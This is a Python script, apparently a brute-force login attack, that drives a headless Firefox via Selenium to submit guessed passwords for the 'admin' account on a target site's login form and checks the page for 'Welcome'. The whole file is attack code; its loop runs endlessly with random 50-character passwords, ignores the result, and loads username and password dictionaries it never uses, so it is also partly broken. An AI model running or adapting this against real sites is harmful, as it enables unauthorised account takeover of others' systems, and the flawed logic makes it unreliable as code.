import sys
from typing import List, Tuple, NoReturn

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import random
import string


def attack(site: str, username: str, password: str) -> bool:
    """
    Attempts a login into the site through Selenium
    :param site:
    :param username:
    :param password:
    :return:
    """

    print("Running attack with " + username + ":" + password)

    options = Options()
    options.add_argument('--headless')
    driver = webdriver.Firefox(options=options)
    driver.get(site)
    username_element = driver.find_element(By.NAME, "username")
    password_element = driver.find_element(By.NAME, "password")

    username_element.send_keys(username)
    password_element.send_keys(password)

    button = driver.find_element(By.NAME, "Login")
    button.click()

    # print(driver.page_source)

    out = "Welcome" in driver.page_source

    driver.quit()

    return out


def run_bruteforce_attack(site: str) -> List[Tuple[str, str]]:
    while True:
        password = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))

        print(f"Running attack with admin: {password}")
        attack(site, "admin", password)

def main(args):
    with open(args.username_dict, "r") as file:
        usernames = file.read().splitlines()
    with open(args.password_dict, "r") as file:
        passwords = file.read().splitlines()
    print(usernames)
    print(f"Running bruteforce attack against {args.target}")
    run_bruteforce_attack(args.target)
